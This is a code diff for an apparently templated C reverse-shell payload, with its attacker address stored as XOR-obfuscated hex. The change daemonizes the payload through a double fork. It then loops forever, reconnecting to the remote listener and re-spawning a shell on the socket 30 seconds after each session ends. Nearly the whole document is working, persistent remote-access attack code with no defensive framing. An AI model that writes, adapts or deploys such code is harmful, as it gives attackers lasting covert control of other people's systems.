@@ -5,6 +5,7 @@
 #include <netinet/in.h>
 #include <sys/types.h>
 #include <sys/socket.h>
+#include <sys/wait.h>
 #include <arpa/inet.h>
 
 #define LHOST xor( from_hex(lhost), "{OBF_KEY}")
@@ -23,16 +24,39 @@ int main(int argc, char *argv[])
     char lport[] = "{LPORT}";
     char shell[] = "{SHELL}";
 
-    sa.sin_family = AF_INET;
-    sa.sin_addr.s_addr = inet_addr(LHOST);
-    sa.sin_port = htons(atoi(LPORT));
+    int status;
+    pid_t pid;
+    //http://thinkiii.blogspot.com/2009/12/double-fork-to-avoid-zombie-process.html
+    //Unix double fork to daemonize
+    if (pid = fork()) {
+        //First parent (grandparent)
+        waitpid(pid, &status, 0);        
+    } else {
+        //First child (parent)
+        if (pid = fork()) {
+            //Parent -- orphan the grandchild
+            exit(0);
+        } else {
+            //Grandchild - do the work
 
-    s = socket(AF_INET, SOCK_STREAM, 0);
-    connect(s, (struct sockaddr *)&sa, sizeof(sa));
-    dup2(s, 0);
-    dup2(s, 1);
-    dup2(s, 2);
+            sa.sin_family = AF_INET;
+            sa.sin_addr.s_addr = inet_addr(LHOST);
+            sa.sin_port = htons(atoi(LPORT));
+            while (1) {
+                if (pid = fork()) {
+                    s = socket(AF_INET, SOCK_STREAM, 0);
+                    connect(s, (struct sockaddr *)&sa, sizeof(sa));
+                    dup2(s, 0);
+                    dup2(s, 1);
+                    dup2(s, 2);
 
-    execve(SHELL, 0, 0);
+                    execve(SHELL, 0, 0);
+                }
+                //wait for shell to exit, then spawn a new one
+                waitpid(pid, &status, 0);        
+                sleep(30);
+            }
+        }
+    }
     return 0;
 }
